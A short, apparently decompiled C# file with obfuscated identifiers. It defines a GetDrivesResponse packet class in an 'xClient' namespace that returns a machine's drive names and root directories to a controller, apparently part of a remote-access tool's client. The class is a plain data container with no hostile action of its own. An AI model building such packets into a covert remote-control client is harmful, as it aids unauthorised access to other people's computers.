using System;

namespace xClient.Core.Packets.ClientPackets;

[Serializable]
public class GetDrivesResponse : GInterface4
{
	public string[] DriveDisplayName { get; set; }

	public string[] RootDirectory { get; set; }

	public GetDrivesResponse()
	{
	}

	public GetDrivesResponse(string[] driveDisplayName, string[] rootDirectory)
	{
		DriveDisplayName = driveDisplayName;
		RootDirectory = rootDirectory;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
